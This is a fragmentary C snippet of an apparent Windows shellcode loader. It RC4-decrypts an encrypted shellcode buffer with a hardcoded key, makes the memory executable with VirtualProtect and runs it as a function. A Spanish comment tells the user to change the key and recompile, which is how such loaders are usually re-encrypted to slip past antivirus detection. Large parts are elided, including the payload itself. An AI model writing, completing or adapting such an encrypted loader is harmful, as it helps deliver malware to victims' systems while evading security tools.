...
// RC4 key setup
VOID RC4Init(RC4_CTX* ctx, const unsigned char* key, int keylen) {
    int i, j = 0;
    unsigned char t;
...
VOID RC4Crypt(RC4_CTX* ctx, unsigned char* data, int len) {
    int i;
    unsigned char t;
    ...
    for (i = 0; i < len; ++i) {
        ...
        data[i] ^= ctx->s[(ctx->s[ctx->i] + ctx->s[ctx->j]) % 256];
    }
}
...
int main() {
    ...
    RC4_CTX rc4_ctx;
    unsigned char key[] = "mysecretkey";  //cambiar la key y compilar
    RC4Init(&rc4_ctx, key, sizeof(key) - 1);
    RC4Crypt(&rc4_ctx, DecryptedShellcode, sizeof(EncShellcode));

 
    PrintHexData("Shellcode", DecryptedShellcode, sizeof(EncShellcode));

    DWORD oldProtect;
    VirtualProtect(DecryptedShellcode, sizeof(EncShellcode), PAGE_EXECUTE_READWRITE, &oldProtect);
    ((void(*)())DecryptedShellcode)();
